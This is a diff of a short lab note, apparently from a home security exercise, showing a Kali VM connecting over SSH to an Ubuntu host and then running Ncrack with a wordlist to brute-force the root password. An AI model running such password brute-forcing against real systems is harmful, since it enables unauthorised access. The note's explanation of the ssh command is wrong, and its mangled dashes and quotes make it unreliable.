@@ -3,11 +3,14 @@
 
 
 # From attaker ( Kali VM), type below command to make SSH connection to Ubuntu 
-ssh knownUserID@192.168.1.50 “uptime”
+	
+	ssh knownUserID@192.168.1.50 “uptime”
+
 #You need to provide password of knownUserID when prompted.
 # Above commande scans the number of avaible users in Ubuntu.
 
 # Now  intiate the Ncrack tool aginst the Ubuntu's SSH as below 
-ncrack –v 192.168.1.50 --user root –P /tmp/wordlists/passlist –p ssh
+
+	ncrack –v 192.168.1.50 --user root –P /tmp/wordlists/passlist –p ssh
 
 Once command finised running, it will find the password of user root
